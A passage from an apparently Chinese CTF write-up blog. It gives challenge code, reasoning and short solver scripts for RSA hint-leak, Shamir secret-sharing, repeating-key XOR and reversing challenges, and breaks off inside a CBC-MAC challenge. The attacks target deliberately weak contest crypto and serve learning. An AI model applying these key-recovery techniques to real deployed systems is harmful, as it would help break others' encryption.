<p>提示审计另外一道题目的代码，发现很有意思的地方，还是要看仔细</p>
<p>这道题虽然有pad函数，但是并没有作用到m上，直接给m加密了，所以题目的攻击点只能在e=3上（因为我从$p-1=3k+1$上没有获得任何线索）</p>
<p>然后我也很异或，一个广播攻击我给看了好久，注意力确实不集中，想得太复杂了；知道是广播后也就没什么好说的了</p>
<p>此外，这种类型的题目确实比直接给三组$(c_i,\ n_i)$要隐晦许多，还是挺不错的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flagprint(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Crypto-babycrypt"><a href="#Crypto-babycrypt" class="headerlink" title="Crypto-babycrypt"></a>Crypto-babycrypt</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span>():</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">if</span> p &lt;= q:</span><br><span class="line">      p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    pubkey = (e, n)</span><br><span class="line">    privkey = (p, q)</span><br><span class="line">    <span class="keyword">return</span> pubkey, privkey</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, pubkey</span>):</span></span><br><span class="line">    e, n = pubkey</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">pubkey, privkey = genkey()</span><br><span class="line">c = encrypt(flag, pubkey)</span><br><span class="line"></span><br><span class="line">hint = pubkey[<span class="number">1</span>] % (privkey[<span class="number">1</span>] - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pubkey:&#x27;</span>, pubkey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint:&#x27;</span>, hint)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c:&#x27;</span>, c)</span><br></pre></td></tr></table></figure>

<p>呜呜呜尚师傅带带</p>
<p>题目意思很清楚，攻击点只有一个$hint=n%(q-1)$且$p&gt;=q$<br>我是没有任何思路，一直想往dp泄漏上靠；但这道题很眼熟，我记得尚师傅讲过类似的，利用同余以及整除的性质</p>
<p>下面开始复现</p>
<p>将n换成另外一种表达形式，根据同余的性质$a\equiv b\ (mod\ n)$且$c\equiv d\ (mod\ n)$， 则$a+b\equiv c+d\ (mod\ n)$，这里相当于反过来<br>$n\%(q-1)=((p-1)(q-1)+(p+q-1))\%(q-1)=(p+q-1)\%(q-1)=p%(q-1)$</p>
<p>再把hint带入<br>$$<br>hint=p\%(q-1)<br>$$<br>即<br>$$<br>p=k(q-1)+hint<br>$$<br>由条件已知p比q大，所以假设k是正的，而且相同位数的，k不会很大，可爆</p>
<p>已知n，将p替换<br>$$<br>n/q=k(q-1)+hint<br>$$<br>$$<br>n=k(q^2-q)+hint\times q<br>$$<br>显然可以解一个一元二次方程<br>$$<br>kq^2+(hint-k)q-n=0<br>$$<br>判断$\Delta =(hint-k)^2+4kn$，或者直接用sage或者python的库解方程，比赛的时候写得比较烂，但是好像k=1就解出来了</p>
<p>尚师傅yyds</p>
<p>话说回来，我觉得泄漏nq也应该算是一种rsa的经典攻击，但网上现在鲜有见到</p>
<h3 id="Crypto-Shamir’s-Stingy-Sharing"><a href="#Crypto-Shamir’s-Stingy-Sharing" class="headerlink" title="Crypto-Shamir’s Stingy Sharing"></a>Crypto-Shamir’s Stingy Sharing</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random, sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">ba1,ba2</span>):</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">bytes</span>([_a ^ _b <span class="keyword">for</span> _a, _b <span class="keyword">in</span> <span class="built_in">zip</span>(ba1, ba2)])</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line">SHARES = <span class="number">30</span></span><br><span class="line"></span><br><span class="line">poly = [random.getrandbits(BITS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(SHARES)]</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">random.seed(poly[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(bxor(flag, long_to_bytes(random.getrandbits(<span class="built_in">len</span>(flag)*<span class="number">8</span>))).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Take a share... BUT ONLY ONE. &#x27;</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Do you know what an integer is?&#x27;</span>)</span><br><span class="line">	sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">abs</span>(x) &lt; <span class="number">1</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;No.&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> i: poly[i] * <span class="built_in">pow</span>(x, i), <span class="built_in">range</span>(<span class="built_in">len</span>(poly)))))</span><br></pre></td></tr></table></figure>

<p>异或，加密函数就是解密函数；需要知道<code>random.getrandbits(len(flag)*8)</code>，也就是需要知道随机种子<code>poly[0]</code></p>
<p>给的<code>SHARES</code>比较小，所以应该不是梅森旋转随机数的复原；已知</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> i: poly[i] * <span class="built_in">pow</span>(x, i), <span class="built_in">range</span>(<span class="built_in">len</span>(poly))))</span><br></pre></td></tr></table></figure>

<p>即<br>$$<br>\sum_{i=0}^{29}poly{[i]}\times x^i<br>$$<br>x为我们的输入，显然当x=1，输出的就是poly的和<br>$$<br>poly[0]+poly[1]+poly[2]+poly[3]+…+poly[29]<br>$$<br>如果我们知道<br>$$<br>poly[0]+poly[1]\times 2+poly[2]\times 2^2+poly[3]\times 2^3+…+poly[29]\times 2^{29}<br>$$<br>等一系列的，估计可以搞点事情；可惜同一组poly只能求到关于一个x的多项式</p>
<p>找了许久才在la佬博客里找到关于Shamir的攻击，其他的基本上都是一些实现过程</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210810095550916.png" alt="image-20210810095550916"></p>
<p>设poly[0]为$s_1$，poly[0]+2为$s_2$，$poly[1]+poly[2]+poly[3]+…+poly[29]$为A，p我们整一个256位的素数<br>$$<br>s_1+A-f(x)_1\equiv 0\ (mod\ p)<br>$$<br>$$<br>s_2+A-f(x)_2\equiv 0\ (mod\ p)<br>$$<br>$$<br>s_1+2-s_2\equiv 0\ (mod\ p)<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y1 = <span class="number">4597744014826739716773723494617979066503</span></span><br><span class="line">y2 = y1 + <span class="number">2</span></span><br><span class="line">PR.&lt;s1,s2,A&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f1 = s1 + A - y1</span><br><span class="line">f2 = s2 + A - y2</span><br><span class="line">f3 = a * s1 + b - s2</span><br><span class="line">Fs = [f1, f2, f3]</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;s1 =&#x27;</span>, ZZ(-B[<span class="number">0</span>](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;s2 =&#x27;</span>, ZZ(-B[<span class="number">1</span>](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)))</span><br></pre></td></tr></table></figure>

<p>emmmmm果然偷鸡取巧不是正道，只有一个方程，再怎么变也不可能变成方程组</p>
<p>最后尚师傅提示我了，呜呜呜，尚师傅超神了</p>
<p>不是要知道第一位吗，不妨我们给的x是100000000000000000000000000000000000000000000，差不多凑到128位多点，这样就会得到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210810101824190.png" alt="image-20210810101824190"></p>
<p>没错，poly的每一个值都暴露在眼前</p>
<p>这里的题目不会是Shamir的0day吧，kiddingXD</p>
<p>剩下的写个小脚本，设置下随机数就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">ba1, ba2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([_a ^ _b <span class="keyword">for</span> _a, _b <span class="keyword">in</span> <span class="built_in">zip</span>(ba1, ba2)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;6068879a5da40b08757b59a3924302244a52c2162505e531ccd061739e03d2&#x27;</span></span><br><span class="line"></span><br><span class="line">ploy0 =  <span class="number">324624027062034109200467879481074306259</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">1000</span>):</span><br><span class="line">    random.seed(ploy0)</span><br><span class="line">    <span class="built_in">print</span>(bxor(long_to_bytes(<span class="built_in">int</span>(cipher, <span class="number">16</span>)), long_to_bytes(random.getrandbits(k * <span class="number">8</span>))))</span><br></pre></td></tr></table></figure>

<h3 id="Crypto-rotoRSA-unsolved"><a href="#Crypto-rotoRSA-unsolved" class="headerlink" title="Crypto-rotoRSA(unsolved)"></a>Crypto-rotoRSA(unsolved)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> poly, symbols</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> Crypto.Random.random <span class="keyword">as</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_poly</span>(<span class="params">coeffs</span>):</span></span><br><span class="line">    x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> poly(<span class="built_in">sum</span>(coeff * x ** i <span class="keyword">for</span> i, coeff <span class="keyword">in</span> <span class="built_in">enumerate</span>(coeffs)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_msg</span>(<span class="params">msg, poly, e, N</span>):</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(poly(msg), e, N)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">N = p * q</span><br><span class="line">e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">coeffs = deque([random.randint(<span class="number">0</span>, <span class="number">128</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">welcome_message = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Welcome to RotorSA!</span></span><br><span class="line"><span class="string">With our state of the art encryption system, you have two options:</span></span><br><span class="line"><span class="string">1. Encrypt a message</span></span><br><span class="line"><span class="string">2. Get the encrypted flag</span></span><br><span class="line"><span class="string">The current public key is</span></span><br><span class="line"><span class="string">n = <span class="subst">&#123;N&#125;</span></span></span><br><span class="line"><span class="string">e = <span class="subst">&#123;e&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(welcome_message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    padding = build_poly(coeffs)</span><br><span class="line">    choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;What is your choice? &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">        message = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;What is your message? &#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        encrypted = encrypt_msg(message, padding, e, N)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;The encrypted message is <span class="subst">&#123;encrypted&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">        encrypted_flag = encrypt_msg(flag, padding, e, N)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;The encrypted flag is <span class="subst">&#123;encrypted_flag&#125;</span>&#x27;</span>)</span><br><span class="line">    coeffs.rotate(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/rotorsa.jpg" alt="rotorsa"></p>
<p>ECC有点吃力了，没有做下去</p>
<h3 id="Re-verybabyrev"><a href="#Re-verybabyrev" class="headerlink" title="Re-verybabyrev"></a>Re-verybabyrev</h3><p>checksec一下，发现是小端序，这点很重要，后面我在s1的每一个地方都逆序了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210807205724502.png" alt="image-20210807205724502"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 s1[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">140</span>]; <span class="comment">// [rsp+70h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+FCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  s1[<span class="number">0</span>] = <span class="string">&#x27;EH\x1D\x12\x17\x11\x13\x13&#x27;</span>;</span><br><span class="line">  s1[<span class="number">1</span>] = <span class="string">&#x27;\t_B,&amp;\vAE&#x27;</span>;</span><br><span class="line">  s1[<span class="number">2</span>] = <span class="string">&#x27;T\x1BVV=l_\v&#x27;</span>;</span><br><span class="line">  s1[<span class="number">3</span>] = <span class="string">&#x27;X\\\v&lt;)EA_&#x27;</span>;</span><br><span class="line">  s1[<span class="number">4</span>] = <span class="string">&#x27;@*lT\t]_\0&#x27;</span>;</span><br><span class="line">  s1[<span class="number">5</span>] = <span class="string">&#x27;K_BH\&#x27;</span>j\x06\x06<span class="number">&#x27;</span>;</span><br><span class="line">  s1[<span class="number">6</span>] = <span class="string">&#x27;l^]C,-BV&#x27;</span>;</span><br><span class="line">  s1[<span class="number">7</span>] = <span class="string">&#x27;k1^CG\aA-&#x27;</span>;</span><br><span class="line">  s1[<span class="number">8</span>] = <span class="string">&#x27;^TI\x1Cn;\nZ&#x27;</span>;</span><br><span class="line">  s1[<span class="number">9</span>] = <span class="string">&#x27;((G^\x054+\x1A&#x27;</span>;</span><br><span class="line">  s1[<span class="number">10</span>] = <span class="string">&#x27;\x06\x04P\a;&amp;\x11\x1F&#x27;</span>;</span><br><span class="line">  s1[<span class="number">11</span>] = <span class="string">&#x27;\nwH\x03\x05\v\r\x04&#x27;</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your flag: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( s[<span class="number">0</span>] != <span class="number">114</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt;= <span class="number">126</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s[i] ^= s[i + <span class="number">1</span>];</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(s1, s, <span class="number">97uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后也很像有一个初始状态的流密码，依次异或回去就好了</p>
<p>kw，scr1pt师傅竟然说我的代码写得丑，气得我抢了他的flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">s1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">s1 += <span class="string">b&#x27;EH\x1D\x12\x17\x11\x13\x13&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;\t_B,&amp;\vAE&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;T\x1BVV=l_\v&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;X\\\v&lt;)EA_&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;@*lT\t]_\0&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;K_BH\&#x27;j\x06\x06&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;l^]C,-BV&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;k1^CG\aA-&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;^TI\x1Cn;\nZ&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;((G^\x054+\x1A&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;\x06\x04P\a;&amp;\x11\x1F&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 += <span class="string">b&#x27;\nwH\x03\x05\v\r\x04&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">s1 = s1.decode()</span><br><span class="line">flag = <span class="string">&#x27;r&#x27;</span></span><br><span class="line">t = <span class="built_in">chr</span>(<span class="built_in">ord</span>(s1[<span class="number">0</span>]) ^ <span class="built_in">ord</span>(<span class="string">&#x27;r&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1[<span class="number">1</span>:]:</span><br><span class="line">    flag += t</span><br><span class="line">    t = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(t))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>不过话说回来，re虽然逆算法，但是还有一些脱壳等的操作，暂时不能很快上手，看了第二题就放弃看了</p>
<h2 id="Bsides-Noida-CTF"><a href="#Bsides-Noida-CTF" class="headerlink" title="Bsides Noida CTF"></a>Bsides Noida CTF</h2><h3 id="Crypto-Xoro-recuring"><a href="#Crypto-Xoro-recuring" class="headerlink" title="Crypto-Xoro(recuring)"></a>Crypto-Xoro(recuring)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(a,b)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">text, size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> text*(size//<span class="built_in">len</span>(text)) + text[:size%<span class="built_in">len</span>(text)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    keystream = pad(key, <span class="built_in">len</span>(data))</span><br><span class="line">    encrypted = xor(keystream, data)</span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n===== WELCOME TO OUR ENCRYPTION SERVICE =====\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = os.urandom(<span class="number">32</span>)</span><br><span class="line">        pt = <span class="built_in">input</span>(<span class="string">&#x27;[plaintext (hex)]&gt;  &#x27;</span>).strip()</span><br><span class="line">        ct = encrypt(<span class="built_in">bytes</span>.fromhex(pt) + FLAG, key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ciphertext (hex)]&gt;&quot;</span>, ct)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;See ya ;)&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;:( Oops!&quot;</span>, e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Terminating Session!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>不会，一个pad给我整蒙了，看了CTFTIME上的WP，自己读代码还是太菜了</p>
<p>pad不深究，就是将key填充至和pt+flag一样的长度，那么这样想就很简单了吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/Xoro.png" alt="Xoro"></p>
<p>根据cipher以及我们自己定的pt是完全可以得到key的</p>
<p>就是要知道<strong>一个字节相当于两个字符</strong>，所以要知道key，pt的长度起码是有64个字符长</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210810161354309.png" alt="image-20210810161354309"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">text, size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> text*(size//<span class="built_in">len</span>(text)) + text[:size % <span class="built_in">len</span>(text)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    keystream = pad(key, <span class="built_in">len</span>(data))</span><br><span class="line">    encrypted = xor(keystream, data)</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line">pt = <span class="string">&#x27;4&#x27;</span>*<span class="number">64</span></span><br><span class="line">cipher = <span class="string">&#x27;b4547524f42baec143f1d9cb57e3d35eff4b7f3e13f551a2cb0eb73600d6ac1bb2437f0fd90b8bfe6fdaead070c6f945c2604e2535c37087e415a73a01cdb010a24f0e418f4e97&#x27;</span></span><br><span class="line">key = xor(<span class="built_in">bytes</span>.fromhex(pt), <span class="built_in">bytes</span>.fromhex(cipher)[:<span class="number">32</span>])</span><br><span class="line"><span class="built_in">print</span>(encrypt(<span class="built_in">bytes</span>.fromhex(cipher), key))</span><br></pre></td></tr></table></figure>

<p>竟然卡在pad上，做密码学的题目还是太少</p>
<h3 id="Crypto-MACAW"><a href="#Crypto-MACAW" class="headerlink" title="Crypto-MACAW"></a>Crypto-MACAW</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> topsecrets <span class="keyword">import</span> iv, key, secret_msg, secret_tag, FLAG</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(iv)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">/===== MENU =====\\</span></span><br><span class="line"><span class="string">|                |</span></span><br><span class="line"><span class="string">|  [M] MAC Gen   |</span></span><br><span class="line"><span class="string">|  [A] AUTH      |</span></span><br><span class="line"><span class="string">|                |</span></span><br><span class="line"><span class="string">\================/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MAC</span>(<span class="params">data</span>):</span>    </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) % <span class="number">16</span> == <span class="number">0</span>, <span class="string">&quot;Invalid Input&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> data != secret_msg, <span class="string">&quot;Not Allowed!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    tag = cipher.encrypt(data)[-<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> tag.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AUTH</span>(<span class="params">tag</span>):</span></span><br><span class="line">    <span class="keyword">if</span> tag == secret_tag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Successfully Verified!\n[-] Details:&quot;</span>, FLAG)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Verification Flaied !!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(secret_msg)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="built_in">print</span>(menu)</span><br><span class="line">            ch = <span class="built_in">input</span>(<span class="string">&quot;[?] Choice: &quot;</span>).strip().upper()</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">                data = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter plaintext(hex): &quot;</span>).strip()</span><br><span class="line">                tag = MAC(<span class="built_in">bytes</span>.fromhex(data))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Generated tag:&quot;</span>, tag)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] iv:&quot;</span>, iv.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">elif</span> ch == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                tag = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter your tag to verify: 